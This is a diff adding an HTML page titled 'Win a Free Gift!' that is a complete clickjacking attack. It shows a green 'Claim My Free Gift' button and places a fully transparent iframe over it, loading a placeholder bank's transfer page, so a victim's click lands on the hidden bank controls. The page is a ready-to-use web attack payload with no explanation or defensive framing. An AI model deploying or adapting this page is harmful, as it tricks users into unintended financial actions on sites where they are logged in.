@@ -1,0 +1,48 @@
+<html lang="en">
+  <head>
+    <title>Win a Free Gift!</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin-top: 100px;
+      }
+      .decoy-button {
+        padding: 20px 40px;
+        font-size: 24px;
+        color: white;
+        background-color: #4CAF50;
+        border: none;
+        cursor: pointer;
+        z-index: 1;
+        position: relative; /* Ensure it's interactive */
+      }
+      #overlay {
+        position: absolute; /* Position the iframe over the decoy */
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%);
+        width: 300px;
+        height: 200px;
+        opacity: 0; /* Make the iframe invisible */
+        z-index: 2; /* Ensure it's on top */
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Claim your FREE gift now!</h2>
+    <p>Click the button below to claim your prize.</p>
+    
+    <div class="decoy-container">
+      <button class="decoy-button">Claim My Free Gift</button>
+      
+      <!-- The malicious, invisible iframe -->
+      <iframe 
+        id="overlay" 
+        src="http://vulnerable-bank.example.com/transfer.html" 
+        scrolling="no" 
+        frameborder="0">
+      </iframe>
+    </div>
+  </body>
+</html>
